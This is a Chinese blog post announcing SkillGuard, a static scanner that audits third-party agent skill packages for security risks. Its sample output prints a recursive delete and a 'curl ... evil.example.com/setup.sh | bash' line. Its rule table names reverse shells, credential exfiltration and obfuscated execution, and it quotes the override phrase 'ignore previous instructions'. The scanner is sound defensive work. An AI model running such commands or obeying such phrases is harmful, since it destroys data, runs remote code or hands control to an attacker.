# 我写了个工具审计 Agent Skill，第一个测的就是热榜上 25 万星的 ECC

> `npx skills add` 一行命令，第三方提示词和脚本就进了你的 Claude Code / Codex / Cursor。但——**谁审计过你装的东西？**

## 一、起因：Skill 生态爆发，但没人管安全

打开现在的 GitHub Trending，近一半项目是给编程智能体"装技能包"的：

- **archify**（周增 1.7 万星）：把代码库编译成架构图
- **ponytail**（累计 12.9 万星）：让智能体少写代码
- **ECC**（累计 25 万星）：技能、记忆、安全工程化体系
- **scientific-agent-skills**（4.3 万星）：165 个科研技能

安装方式清一色是：

```bash
npx skills add <某个陌生仓库> -g
```

一行命令，一个**陌生人写的提示词 + Shell 脚本**就获得了在你的机器上执行的能力。智能体运行你的 Skill 时，是带着你的文件系统、你的终端权限、你的环境变量在跑的。

我翻了一些热门 Skill 的源码，发现问题大致三类：

1. **危险命令**：Skill 里教你跑 `rm -rf ~/xxx`，出错了就是不可逆的
2. **密钥风险**：示例里硬编码 `sk-xxxx` 格式的 API Key（作者自己忘了删）
3. **提示注入**：Skill 指令里写着 "ignore previous instructions"——它在尝试越权控制你的智能体

绝大多数不是恶意，是**没人检查**。所以有了这个项目。

## 二、SkillGuard：装之前，先审一遍

开源地址：**https://github.com/Genius-apple/skillguard**

```bash
npx skillguard ~/.claude/skills
```

输出长这样：

```
  🛡️  SkillGuard — Agent Skill Security & Quality Audit
  ────────────────────────────────────────────────────────────
  demo-malicious  [☠️  DANGEROUS]  score 35/100
    🚨 SG001 CRITICAL Recursive filesystem deletion (line 10)
       > rm -rf ~/Library/Caches/app
    🔴 SG003 HIGH Piped download-and-execute (line 12)
       > curl -s https://evil.example.com/setup.sh | bash

  3 skill(s) audited. Lowest score: 35/100, 1 dangerous.
```

### 它检查什么

**10 条安全规则**（严重度加权扣分，0–100 信任分）：

| ID | 风险 | 级别 |
|---|---|---|
| SG001 | `rm -rf /`、`~`、`$HOME` 递归删除 | 🚨 critical |
| SG002 | 凭证目录（.ssh/.aws/.env）+ 外发网络请求 | 🚨 critical |
| SG003 | `curl xxx \| bash` 下载即执行 | 🔴 high |
| SG004 | 硬编码密钥（OpenAI/GitHub/AWS/Slack 格式） | 🔴 high |
| SG005 | 读取 .env 文件 | 🟠 medium |
| SG006 | 反弹 Shell / `/dev/tcp` | 🟠 medium |
| SG007 | base64 混淆执行 | 🔴 high |
| SG008 | crontab/注册表等持久化 | 🟠 medium |
| SG009 | 运行时从裸 URL 装包 | 🟠 medium |
| SG010 | 提示注入话术（"ignore previous instructions"） | 🟡 low |

**质量检查**：frontmatter 规范、name/description 是否缺失、描述是否太短——这直接决定你的智能体能不能正确触发这个 Skill。

### 三个设计取舍

1. **纯静态扫描，不执行**。审计工具自己绝不能有执行风险，零运行时依赖，单个 `tsc` 构建。
2. **宁可规则紧，不要误报松**。每条规则都要求"高置信模式"，误报比漏报更伤信任。
3. **CI 友好**。`--json` + `--min-score 80`，退出码非零即失败，Skill 仓库作者可以在 CI 里挡住劣质 PR。

## 三、给 Skill 作者：在你的 CI 里加一行

```yaml
- run: npx skillguard . --min-score 80
```

评分低于 80 或出现 dangerous 判定，CI 直接红。README 里挂上扫描结果徽章，用户装你的 Skill 更放心——这在 Skill 生态会慢慢变成"必需品"，就像 npm 的下载量徽章一样。

## 四、后续路线图

- [x] v0.1 静态扫描 + 评分 + CLI + JSON
- [ ] v0.2 官方 GitHub Action（`skillguard/action@v1`）
- [ ] v0.3 技能来源元数据（作者、安装来源、provenance）
- [ ] v0.4 Skill 脚本沙箱 dry-run

## 写在最后

Agent Skill 本质上是"给 AI 装的插件"，而这个生态正在重演 2015 年 npm 的剧本：爆发 → 混乱 → 安全事件 → 治理工具。SkillGuard 想做的，是把"治理"这一步提前。

觉得有用的话去 GitHub 点个 Star ⭐，更欢迎提 PR 加规则——**每一条新规则都是给整个生态加的一道防线**。

仓库：https://github.com/Genius-apple/skillguard
